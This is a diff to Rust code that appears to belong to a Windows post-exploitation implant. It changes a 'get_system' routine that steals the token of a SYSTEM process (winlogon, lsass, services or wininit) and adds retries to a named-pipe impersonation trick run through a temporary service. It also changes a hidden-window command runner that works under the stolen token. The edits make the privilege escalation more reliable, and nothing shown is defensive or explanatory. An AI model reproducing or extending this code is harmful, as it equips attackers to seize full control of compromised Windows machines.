@@ -181,15 +181,18 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     si.hStdInput  = -1isize; /* INVALID_HANDLE_VALUE */
     let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
 
-    let ok = CreateProcessWithTokenW(
-        token, 0, std::ptr::null(), wcmd.as_mut_ptr(),
+    ImpersonateLoggedOnUser(token);
+    let ok = CreateProcessAsUserW(
+        token, std::ptr::null(), wcmd.as_mut_ptr(),
+        std::ptr::null(), std::ptr::null(), 1,
         CREATE_NO_WINDOW, std::ptr::null(), std::ptr::null(),
         &si, &mut pi,
     );
+    RevertToSelf();
     CloseHandle(h_write);
     if ok == 0 {
         CloseHandle(h_read);
-        return format!("[error: CreateProcessWithTokenW {}]", GetLastError());
+        return format!("[error: CreateProcessAsUserW {}]", GetLastError());
     }
 
     let mut buf = Vec::<u8>::with_capacity(4096);
@@ -384,7 +387,7 @@ use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
 #[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
-    CreateProcessWithTokenW, OpenThreadToken, GetCurrentThread,
+    CreateProcessWithTokenW, CreateProcessAsUserW, OpenThreadToken, GetCurrentThread,
     PROCESS_INFORMATION, STARTUPINFOW, CREATE_NO_WINDOW, STARTF_USESTDHANDLES,
     TOKEN_IMPERSONATE,
 };
@@ -891,20 +894,29 @@ unsafe fn get_system() -> String {
         CloseHandle(hself);
     }
     'T1: {
-        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if snap == INVALID_HANDLE_VALUE { break 'T1; }
-        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
-        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+        const TARGETS: &[&str] = &["winlogon.exe", "lsass.exe", "services.exe", "wininit.exe"];
         let mut sys_pid = 0u32;
-        if Process32First(snap, &mut pe) != 0 {
-            loop {
-                let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
-                let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
-                if name.eq_ignore_ascii_case("winlogon.exe") { sys_pid = pe.th32ProcessID; break; }
-                if Process32Next(snap, &mut pe) == 0 { break; }
+        let mut match_name = "";
+        'search: for tgt in TARGETS {
+            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if snap == INVALID_HANDLE_VALUE { continue; }
+            let mut pe: PROCESSENTRY32 = std::mem::zeroed();
+            pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+            if Process32First(snap, &mut pe) != 0 {
+                loop {
+                    let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
+                    let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
+                    if name.eq_ignore_ascii_case(tgt) {
+                        sys_pid = pe.th32ProcessID;
+                        match_name = tgt;
+                        CloseHandle(snap);
+                        break 'search;
+                    }
+                    if Process32Next(snap, &mut pe) == 0 { break; }
+                }
             }
+            CloseHandle(snap);
         }
-        CloseHandle(snap);
         if sys_pid == 0 { break 'T1; }
         let hproc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sys_pid);
         if hproc == 0 { break 'T1; }
@@ -926,7 +938,7 @@ unsafe fn get_system() -> String {
         let old = G_SYSTEM_TOKEN;
         G_SYSTEM_TOKEN = hprim;
         if old != 0 { CloseHandle(old); }
-        return format!("[+] T1 SYSTEM (winlogon PID={})", sys_pid);
+        return format!("[+] T1 SYSTEM ({} PID={})", match_name, sys_pid);
     }
 
     // ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
@@ -983,10 +995,14 @@ unsafe fn get_system() -> String {
     let mut ov: OVERLAPPED = std::mem::zeroed();
     ov.hEvent = h_event;
 
-    StartServiceW(h_svc, 0, std::ptr::null());
     ConnectNamedPipe(h_pipe, &mut ov); /* async — ERROR_IO_PENDING expected */
+    StartServiceW(h_svc, 0, std::ptr::null());
 
-    let wr = WaitForSingleObject(h_event, 5000);
+    let mut wr = WaitForSingleObject(h_event, 2000);
+    if wr != WAIT_OBJECT_0 {
+        StartServiceW(h_svc, 0, std::ptr::null());
+        wr = WaitForSingleObject(h_event, 3000);
+    }
 
     DeleteService(h_svc); CloseServiceHandle(h_svc); CloseServiceHandle(h_scm);
     CloseHandle(h_event);
